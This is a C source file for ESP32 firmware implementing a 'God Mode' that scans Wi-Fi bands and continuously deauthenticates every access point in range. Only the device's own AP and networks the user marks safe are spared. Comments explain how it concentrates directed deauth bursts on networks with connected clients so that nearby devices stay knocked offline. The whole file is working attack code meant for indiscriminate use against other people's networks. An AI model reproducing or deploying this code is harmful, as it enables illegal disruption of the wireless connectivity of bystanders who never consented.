/*
 * God Mode — scan both bands, then continuously deauth every AP found,
 * hopping channel/band for each. Call god_mode_process() in a loop.
 */
#include <stddef.h>
#include <string.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "god_mode.h"
#include "wifi_controller.h"
#include "deauth_engine.h"

static const char *TAG = "GOD_MODE";
static bool s_active = false;

#define GOD_BURST 48   // broadcast frames per AP per sweep

void god_mode_start(void)
{
    if (s_active) return;
    ESP_LOGW(TAG, "GOD MODE ON — attacking every network (except SAFE)");
    // The attack loop does an immediate refresh scan on entry, so no scan here.
    s_active = true;
}

void god_mode_stop(void)
{
    if (!s_active) return;
    s_active = false;
    ESP_LOGI(TAG, "GOD MODE OFF");
}

int god_mode_process(void)
{
    if (!s_active) return 0;

    uint8_t own[6];
    esp_wifi_get_mac(WIFI_IF_AP, own);   // don't attack our own control AP

    const wifi_network_t *nets = NULL;
    int count = wifi_get_networks(&nets);

    // FOCUS FIRE: attack only networks that actually have detected clients.
    // Broadcasting at empty networks wastes radio time and is why plain God Mode
    // holds nothing — concentrating on client-bearing APs revisits each far more
    // often (shorter cycle), which is what actually keeps devices down.
    int client_nets = 0;
    for (int i = 0; i < count && s_active; i++) {
        if (memcmp(nets[i].bssid, own, 6) == 0) continue;   // never our own AP
        if (nets[i].safe) continue;                         // user-protected
        wifi_client_t cl[WIFI_MAX_CLIENTS];
        int nc = wifi_get_clients(i, cl, WIFI_MAX_CLIENTS);
        if (nc == 0) continue;                              // no devices here — skip
        client_nets++;
        int sent = deauth_attack_network(&nets[i], GOD_BURST);       // broadcast
        for (int c = 0; c < nc; c++)
            sent += deauth_client(nets[i].bssid, cl[c].mac, 32);     // heavy directed
        wifi_add_tx(i, sent);
    }

    // Fallback: if the last sniff found no clients anywhere, do one broadcast
    // sweep so we still disrupt and the next refresh can discover clients.
    if (client_nets == 0) {
        for (int i = 0; i < count && s_active; i++) {
            if (memcmp(nets[i].bssid, own, 6) == 0) continue;
            if (nets[i].safe) continue;
            wifi_add_tx(i, deauth_attack_network(&nets[i], GOD_BURST));
        }
    }
    return client_nets;
}
